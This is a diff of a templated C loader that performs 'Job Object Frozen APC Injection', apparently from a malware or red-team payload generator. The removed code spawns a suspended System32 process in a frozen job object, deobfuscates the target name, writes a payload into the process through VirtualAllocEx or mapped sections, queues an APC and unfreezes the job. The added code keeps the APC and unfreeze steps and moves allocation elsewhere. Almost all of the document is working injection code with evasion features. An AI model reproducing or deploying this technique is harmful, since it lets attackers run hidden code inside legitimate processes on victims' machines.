@@ -1,173 +1,24 @@
 
-typedef struct _JOBOBJECT_WAKE_FILTER {
-    ULONG HighEdgeFilter;
-    ULONG LowEdgeFilter;
-} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;
-
-typedef struct _JOBOBJECT_FREEZE_INFORMATION {
-    union {
-        ULONG Flags;
-        struct {
-            ULONG FreezeOperation : 1;
-            ULONG FilterOperation : 1;
-            ULONG SwapOperation : 1;
-            ULONG Reserved : 29;
-        };
-    };
-    BOOLEAN Freeze;
-    BOOLEAN Swap;
-    UCHAR Reserved0[2];
-    JOBOBJECT_WAKE_FILTER WakeFilter;
-} JOBOBJECT_FREEZE_INFORMATION, * PJOBOBJECT_FREEZE_INFORMATION;
-
-void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T payload_len) {
-    HANDLE hProcess = NULL;
-    HANDLE hThread = NULL;
-    HANDLE hJob = NULL;
-    DWORD dwProcessId = 0;
-    PVOID pRemoteAddress = NULL;
-    char lpPath[MAX_PATH * 2];
-    char WnDr[MAX_PATH];
+void ExecutePayload(void* pRemoteAddress, const unsigned char* payload, SIZE_T payload_len, HANDLE hTargetProcess, HANDLE hTargetThread, HANDLE hJob) {
+    JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
+    (void)payload;     // Unused, already written by base template
+    (void)payload_len; // Unused
+    (void)hTargetProcess; // Unused in this function (only used for alloc/write), but good to have
 
     DEBUG_PRINT("Executing payload via Job Object Frozen APC Injection...");
 
-    DEBUG_PRINT("Creating job object for process freezing...");
-    NTSTATUS jobStatus = pfnNtCreateJobObject(&hJob, JOB_OBJECT_ALL_ACCESS, NULL);
-    if (!NT_SUCCESS(jobStatus)) {
-        DEBUG_PRINT("NtCreateJobObject failed: 0x%X", jobStatus);
+    if (pRemoteAddress == NULL) {
+        DEBUG_PRINT("ExecutePayload: Received a NULL pointer. Aborting.");
         return;
     }
-
-    JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
-    freezeInfo.FreezeOperation = 1;
-    freezeInfo.Freeze = TRUE;
-
-    jobStatus = pfnNtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, 
-                                           &freezeInfo, sizeof(freezeInfo));
-    if (!NT_SUCCESS(jobStatus)) {
-        DEBUG_PRINT("NtSetInformationJobObject (freeze) failed: 0x%X", jobStatus);
-        pfnCloseHandle(hJob);
-        return;
-    }
-
-    if (!pfnGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
-        DEBUG_PRINT("GetEnvironmentVariableA failed with error %d", pfnGetLastError());
-        goto cleanup_job;
-    }
-
-    char sSystem32[] = "\\System32\\";
-    
-    {% if obfuscate_execution_strings %}
-    unsigned char sTargetProcess_obfuscated[] = { {{ target_process_obfuscated }} };
-    char sTargetProcess[sizeof(sTargetProcess_obfuscated)];
-    
-    pfnRtlMoveMemory(sTargetProcess, sTargetProcess_obfuscated, sizeof(sTargetProcess_obfuscated));
-    DeobfuscateString((unsigned char*)sTargetProcess, sizeof(sTargetProcess_obfuscated));
-    sTargetProcess[sizeof(sTargetProcess_obfuscated)] = '\0';
-
-    DEBUG_PRINT("Deobfuscated target process name");
-    {% else %}
-    char sTargetProcess[] = "{{ target_process }}";
-    {% endif %}
-
-    size_t sWnDrLen = pfnLstrlenA(WnDr);
-    size_t sSystem32Len = pfnLstrlenA(sSystem32);
-    size_t sTargetProcessLen = pfnLstrlenA(sTargetProcess);
-
-    pfnRtlMoveMemory(lpPath, WnDr, sWnDrLen);
-    pfnRtlMoveMemory(lpPath + sWnDrLen, sSystem32, sSystem32Len);
-    pfnRtlMoveMemory(lpPath + sWnDrLen + sSystem32Len, sTargetProcess, sTargetProcessLen);
-    
-    lpPath[sWnDrLen + sSystem32Len + sTargetProcessLen] = '\0';
-    
-    DEBUG_PRINT("Constructed path: '%s'", lpPath);
-
-    {% if obfuscate_execution_strings %}
-    pfnRtlZeroMemory(sTargetProcess, sizeof(sTargetProcess));
-    {% endif %}
-
-    DEBUG_PRINT("Creating suspended process in job object...");
-    
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
-    pfnRtlZeroMemory(&si, sizeof(si));
-    pfnRtlZeroMemory(&pi, sizeof(pi));
-    si.cb = sizeof(si);
-
-    if (!pfnCreateProcessA(NULL, lpPath, NULL, NULL, FALSE, 
-                          CREATE_SUSPENDED | CREATE_BREAKAWAY_FROM_JOB, 
-                          NULL, NULL, &si, &pi)) {
-        DEBUG_PRINT("CreateProcessA failed with error: %d", pfnGetLastError());
-        goto cleanup_job;
-    }
-
-    jobStatus = pfnNtAssignProcessToJobObject(hJob, pi.hProcess);
-    if (!NT_SUCCESS(jobStatus)) {
-        DEBUG_PRINT("NtAssignProcessToJobObject failed: 0x%X", jobStatus);
-        goto cleanup_process;
-    }
-
-    hProcess = pi.hProcess;
-    hThread = pi.hThread;
-    dwProcessId = pi.dwProcessId;
-    DEBUG_PRINT("Successfully created suspended process in job with PID: %lu", dwProcessId);
-
-    DEBUG_PRINT("Resuming process - threads remain frozen by job object...");
-    pfnResumeThread(hThread);
-
-    {% if allocation_method == 'virtualalloc' %}
-        DEBUG_PRINT("Using VirtualAllocEx for remote memory allocation...");
-        DWORD dwOldProt = 0;
-        pRemoteAddress = pfnVirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (pRemoteAddress == NULL) {
-            DEBUG_PRINT("VirtualAllocEx failed with error: %d", pfnGetLastError());
-            goto cleanup;
-        }
-        if (!pfnWriteProcessMemory(hProcess, pRemoteAddress, payload, payload_len, NULL)) {
-            DEBUG_PRINT("WriteProcessMemory failed with error: %d", pfnGetLastError());
-            goto cleanup;
-        }
-        if (!pfnVirtualProtectEx(hProcess, pRemoteAddress, payload_len, PAGE_EXECUTE_READ, &dwOldProt)) {
-            DEBUG_PRINT("VirtualProtectEx failed with error: %d", pfnGetLastError());
-            goto cleanup;
-        }
-    {% elif allocation_method == 'mappedsection' %}
-        DEBUG_PRINT("Using Mapped Sections for remote memory allocation...");
-        HANDLE hSection = NULL;
-        PVOID pLocalAddress = NULL;
-        LARGE_INTEGER sectionSize;
-        sectionSize.QuadPart = payload_len;
-
-        pfnNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
-        if (hSection == NULL) {
-            DEBUG_PRINT("NtCreateSection failed.");
-            goto cleanup;
-        }
-        
-        pfnNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalAddress, 0, 0, NULL, (PSIZE_T)&payload_len, 2, 0, PAGE_READWRITE);
-        if (pLocalAddress == NULL) {
-            DEBUG_PRINT("Local NtMapViewOfSection failed.");
-            pfnCloseHandle(hSection);
-            goto cleanup;
-        }
-        
-        pfnRtlMoveMemory(pLocalAddress, payload, payload_len);
-        
-        pfnNtMapViewOfSection(hSection, hProcess, &pRemoteAddress, 0, 0, NULL, (PSIZE_T)&payload_len, 2, 0, PAGE_EXECUTE_READ);
-        if (pRemoteAddress == NULL) {
-            DEBUG_PRINT("Remote NtMapViewOfSection failed.");
-            pfnCloseHandle(hSection);
-            goto cleanup;
-        }
-        pfnCloseHandle(hSection);
-    {% endif %}
 
     DEBUG_PRINT("Queuing APC to frozen thread at %p", pRemoteAddress);
-    pfnQueueUserAPC((PAPCFUNC)pRemoteAddress, hThread, (ULONG_PTR)NULL);
+    pfnQueueUserAPC((PAPCFUNC)pRemoteAddress, hTargetThread, (ULONG_PTR)NULL);
 
     DEBUG_PRINT("Unfreezing job to execute APC...");
+    freezeInfo.FreezeOperation = 1;
     freezeInfo.Freeze = FALSE;
-    jobStatus = pfnNtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, 
+    NTSTATUS jobStatus = pfnNtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, 
                                            &freezeInfo, sizeof(freezeInfo));
     if (!NT_SUCCESS(jobStatus)) {
         DEBUG_PRINT("NtSetInformationJobObject (unfreeze) failed: 0x%X", jobStatus);
@@ -175,35 +26,12 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
 
     {% if output_format == 'dll' %}
     DEBUG_PRINT("DLL mode - waiting for process execution...");
-    pfnWaitForSingleObject(hProcess, 10000);
+    pfnWaitForSingleObject(hTargetProcess, 10000);
     {% endif %}
 
     DEBUG_PRINT("Job Object Frozen APC injection complete.");
 
-cleanup:
-    if (hThread) {
-        pfnCloseHandle(hThread);
-    }
-    if (hProcess) {
-        pfnCloseHandle(hProcess);
-    }
-
-cleanup_process:
-    if (hThread) pfnCloseHandle(hThread);
-    if (hProcess) pfnCloseHandle(hProcess);
-    
-cleanup_job:
+    if (hTargetThread) pfnCloseHandle(hTargetThread);
+    if (hTargetProcess) pfnCloseHandle(hTargetProcess);
     if (hJob) pfnCloseHandle(hJob);
-
-cleanup_strings:
-    pfnRtlZeroMemory(WnDr, sizeof(WnDr));
-    pfnRtlZeroMemory(lpPath, sizeof(lpPath));
-    pfnRtlZeroMemory(sSystem32, sizeof(sSystem32));
-    {% if obfuscate_execution_strings %}
-    pfnRtlZeroMemory(sTargetProcess_obfuscated, sizeof(sTargetProcess_obfuscated));
-    {% else %}
-    pfnRtlZeroMemory(sTargetProcess, sizeof(sTargetProcess));
-    {% endif %}
-    
-    DEBUG_PRINT("String cleanup complete.");
 }
